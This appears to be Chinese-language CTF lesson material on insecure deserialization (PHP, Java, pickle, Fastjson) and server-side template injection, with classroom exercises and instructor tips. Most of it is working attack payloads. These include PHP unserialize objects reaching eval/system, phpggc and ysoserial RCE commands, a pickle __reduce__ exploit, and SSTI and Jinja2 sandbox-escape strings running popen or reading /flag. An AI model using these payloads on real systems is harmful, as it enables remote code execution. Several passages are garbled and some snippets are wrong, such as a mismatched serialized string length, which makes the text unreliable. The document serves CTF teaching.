# W6 · 反序列化與 SSTI（35 分鐘）

> 兩個都是「代碼執行」的通道；一個靠語言的物件魔法（PHP/Java/Python），一個靠模板引擎的表達式。

---

## A 部分 · 反序列化

### A.1 原理：把位元組流變回物件，連帶魔法函數一起執行

```php
unserialize(string $_data) → Object
```

重要點：反序列化「**不執行你給的函數**」，但會自動觸發「**魔法方法**」：

| 魔法法 | 觸發時機 |
|---|---|
| `__construct()` | new |
| `__destruct()` | 物件被 GC / unset / 生命周期結束 |
| `__wakeup()` | unserialize 後第一件事 |
| `__toString()` | 物件被當字串 |
| `__get()` / `__set()` | 讀/寫不存在屬性 |
| `__call()` | 呼叫不存在方法 |
| `__sleep()` | serialize 前調用 |
| `__invoke()` | 物件當函式用 |

**CTF 目標**：把「使用者可控字串」→ `unserialize()` → 構造出 —— 反序列化後的物件在生命週期的某些時刻，調 dispatcher 的魔函數（`__destruct`/`__wakeup`…），裡面執行我們塞的字串。

### A.2 一個最小可打包的例子

```php
<?php
class A {
    public $cmd = "id";
    function __destruct() { eval($this->cmd); }   // 漏洞源頭
}
// 惡意的輸入
$payload = 'O:1:"A":1:{s:3:"cmd";s:16:"system("id");";}';
unserialize($payload);   // eval system('id')
```

**payload 製作模板**（直接 `serialize()` 惡意物件後列印）：

```php
<?php
class A { public $cmd = 'system("cat /flag");'; function __destruct(){ eval($this->cmd); } }
echo serialize(new A);
// O:1:"A":1:{s:3:"cmd";s:20:"system("cat /flag");";}
```

> 把這串 POST 到有 `unserialize` 的 API 即可。注意**字串長度**（`s:20`）必須與實際匹配，序列化語法非常敏感。

### A.3 PHPGGC ——二段頂利器

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l                          # 列出所有 gadget chains
./phpggc Laravel/RCE1 system id      # Laravel 的 RCE 鏈
./phpggc Monolog/RCE1 system id -b   # -b = base64 輸出
# 輸出直接放進 unserialized 字串（CTF 通常已預置）
```

### A.4 Java 反序列化（CTF 入門常用 cc 鏈）

- 形態：payload 是 Java 物件序列化流（二 that 自帶 `AC ED 00 05` 或 `rO0A`）。
- **旣泛用 commons-collections 3.1 / 3.2.1**：有預構造好的 `CommonsBeanutils`、`CommonsCollections1..7`。
- 用 ysoserial 生成：

```bash
java -jar ysoserial.jar CommonsCollections5 'cat /flag' > ex.ser
# 配 XMLDecoder（CVE-2017-10271）/ JNDI webhook 等
```

### A.5 Python 反序列化（pickle 語系）

```python
import pickle, base64
class Exploit(object):
    def __reduce__(self):
        return (eval, ("__import__('os').system('cat /flag')",))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

> **防禦**：`pickle.load` 只用於內部固定資料，永遠不要載入 *使用者* 提供的 pickle bytes。

### A.6 Fastjson（Java JSON 的 autoType 陷阱）

```json
{"@type":"java.net.Inet4Address","val":"xml 靠對象/DNSLog 資產"}
```

> 注意是 `Inet4Address`、不是 `localhost`，使用 DNSLOG 驗證 autoType 是否開啟。

> **CTF 常見版本**：
> `fastjson 1.2.24`、`1.2.47`（直接 `@type` + `autoTypeSupport`）、`1.2.68` 的 bypass 版。

---

## B 部分 · SSTI（模板注入）

### B.1 拿模樣如何映射（模板的「括號」就是程式碼）

- Flask/Jinja2：`{{ 7*7 }}`、`{%…%}`
- Twig：`{{ 7*7 }}`、`{%…%}`
- Mako：`${7*7}`
- Tornado：`{{7*7}}`、`{…}`
- Velocity：`#set($x=7*7)$x`
- EJS：`<%= 7*7 %>`

**檢測 algorithm**（15 分鐘内上手）：

```text
{{7*7}}=49   → Jinja/Twig/Tornado
${7*7}=49    → Mako (語法較不同)
<%= 7*7 %>=49 → EJS
{var}       → Velocity/Smarty
```

### B.2 payload 入門（拿檔案讀）

**Flask/Jinja2 最小 payload**：

```text
{{ ''.__class__.__mro__[1].__subclasses__() }}          # enum all classes
# 找到有 read 的 file/io class（e.g. via .read()） → 設置 index
{{ ''.__class__.__mro__[1].__subclasses__()[x]._ __init__ . . . }}
```

**>x 探訪問指南**：

```text
{{ c.__init__.__globals__.__builtins__.open('flag.txt').read() }}
{{ namespace.__init__.__globals__.__builtins__.open('flag.txt').read() }}
```

> CTF 常見的 **「bin class」**：需要找一個「具備 searchable attrs」的 class，
> 採取 `frame` 的真正 greedy: **`g['builtins']` 仍是 Python 的速食。**

### B.3 拿 object 的四層金字塔

| # | 條件 | payload |
|---|---|---|
| 1 | 模板支援 `{{ }}` | `{{ 7*7 }}` |
| 2 | 內建 `request`/`session` 等代替讀 | `{{ request.__class__ }}` |
| 3 | 有 attr 摇 ▓（`mro()` | `{{ ''.__class__.__mro__ }}` |
| 4 | 能 evaulate 函數 | `{{ c.__init__.__globals__['os'].popen('id').read() }}` |

### B.4 沙盒環境（真正 CTF 裡最常見）

Jinja2 的 sandbox 強化版（下一個 jump）：

```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string(user_input_with_template)
```

**沙盒的 stringy / attribute access**：SSTI 漏洞主要透過 `__globals__` / `__subclasses__` 得手，但 sandbox 常擋 `__globals__`。
**補到 accepted `jinja2` sandbox mapping**： `沙盒` 限制 attribute 句柄 so 用 ` {{ x '/' '__class__'}}  ` 的`a/b` 结构 concat method：拼接 base 64 執行 escaped eval。

```text
沙盒常見防禦；用 `finalize` / `org.founds`.
sys 逃韧方法：
    `{{ namespace.__init__.__globals__['os'] }}`               # sandbox 後判斷
    `{{ lipsum.__globals__['__builtins__']['os'] }}`            # lipsum has globals
    `{{ cycler.__init__.__globals__.os }}`                     # cycler / joiner
```

### B.5 Mako / Tornado / Velocity 代碼範版

```text
Mako: ${__import__('os').popen('id').read()}      # 最短 Till!*
Tornado: {{ __import__("os").popen("id").read() }}
Velocity: #set($e="e")${e}val(...)
Smarty: {$x|phpinfo}
EJS: <%= global.process.mainModule.require('fs').readFileSync('/flag').toString() %>
```

***

## 課堂練習（10 分鐘）

| 練習 | 話題 |
|---|---|
| 練習 18（SSTI 開關） | `{{}}` 偵測 + 拿 flag |
| 練習 19（PHP 反序列化） | 手造 payload 或 phpggc |
| 練習 20（Python pickle） | `__reduce__` RCE |

## 講師提示

- SSTI 10 分鐘 demo；嚴格做 `{{7*7}}` → 找 engine → 組 payload 三步。
- 反序列化集中在 PHP 段（`unserialize` payload 格式）、Python pickle、Java ysoserial 三者做 1 對映訊波行；不用得「反正都是他了」。
